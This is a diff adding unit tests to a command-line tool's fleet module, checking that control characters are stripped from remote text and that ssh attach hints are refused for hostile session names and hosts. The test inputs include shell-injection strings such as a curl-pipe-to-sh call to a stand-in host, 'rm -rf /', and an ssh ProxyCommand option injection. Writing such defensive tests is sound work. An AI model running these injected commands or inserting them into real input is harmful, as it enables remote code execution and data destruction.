@@ -63,6 +63,14 @@ test('stripRemoteText: kills CSI/OSC/C0/C1 and caps length', () => {
   assert.equal(stripRemoteText(null), '');
 });
 
+test('stripRemoteText: strips TAB/LF/CR too, so a field cannot inject fake table rows', () => {
+  const out = stripRemoteText('line1\nfake ● online\tcol');
+  assert.ok(!out.includes('\n'), 'no newline survives');
+  assert.ok(!out.includes('\t'), 'no tab survives');
+  assert.ok(!out.includes('\r'), 'no CR survives');
+  assert.equal(out, 'line1fake ● onlinecol');
+});
+
 test('validateEnvelope: schema window, skew detected, junk rejected', () => {
   const good = { schema: 1, minSchema: 1, cli: '1.13.0', host: 'build1', caps: [], sessions: [] };
   assert.equal(validateEnvelope(good).ok, true);
@@ -184,6 +192,48 @@ test('attachHintRemote wraps the local hint in ssh -t', async () => {
   const { attachHintRemote } = await import('../src/fleet.js');
   assert.equal(attachHintRemote('gpu', 'tmux', 'unsnooze'), `ssh -t gpu 'tmux new -A -s unsnooze'`);
   assert.equal(attachHintRemote('gpu', 'zellij', 'unsnooze'), `ssh -t gpu 'zellij attach unsnooze'`);
+});
+
+test('attachHintRemote: hostile muxSession (shell metachars) yields no hint at all', async () => {
+  const { attachHintRemote } = await import('../src/fleet.js');
+  assert.equal(attachHintRemote('gpu', 'tmux', "x'; curl evil.sh|sh; echo '"), null);
+  assert.equal(attachHintRemote('gpu', 'tmux', 'a; rm -rf /'), null);
+  assert.equal(attachHintRemote('gpu', 'tmux', 'a b'), null);
+  assert.equal(attachHintRemote('gpu', 'tmux', ''), null);
+  assert.equal(attachHintRemote('gpu', 'tmux', undefined), null);
+});
+
+test('attachHintRemote: hostile dest also yields no hint', async () => {
+  const { attachHintRemote } = await import('../src/fleet.js');
+  assert.equal(attachHintRemote('-oProxyCommand=evil', 'tmux', 'unsnooze'), null);
+  assert.equal(attachHintRemote('a;rm -rf /', 'tmux', 'unsnooze'), null);
+});
+
+test('attachHintRemote: a clean muxSession still round-trips', async () => {
+  const { attachHintRemote } = await import('../src/fleet.js');
+  assert.equal(attachHintRemote('build1', 'zellij', 'my-session.1_2'), `ssh -t build1 'zellij attach my-session.1_2'`);
+});
+
+test('fleet table/json path: hostile muxSession produces no attach line', async () => {
+  const { fetchFleet, formatFleetTui } = await import('../src/fleet.js');
+  const evilSession = frameIt({
+    schema: S, minSchema: 1, cli: '9.9.9', host: 'evil', caps: [],
+    sessions: [{
+      key: 'k1', agent: 'claude', status: 'stopped',
+      cwd: '/tmp', resetAt: Date.now() + 60_000, mux: 'tmux',
+      muxSession: "x'; curl evil.sh|sh; echo '",
+    }],
+  });
+  const results = await fetchFleet({
+    hosts: { evil: 'evil' },
+    spawnFn: fakeSsh({ stdout: evilSession }),
+  });
+  // The rendered table (what `unsnooze fleet` and `--json` consumers act on
+  // for display) must never emit an attach hint built from the hostile
+  // muxSession, since that hint is meant to be pasted into a shell.
+  const tui = formatFleetTui(results, { color: false, hosts: { evil: 'evil' } });
+  assert.doesNotMatch(tui, /attach:/);
+  assert.doesNotMatch(tui, /curl evil\.sh/);
 });
 
 test('collectChild timeout is self-contained (not unref\'d) so safety net always works', async () => {
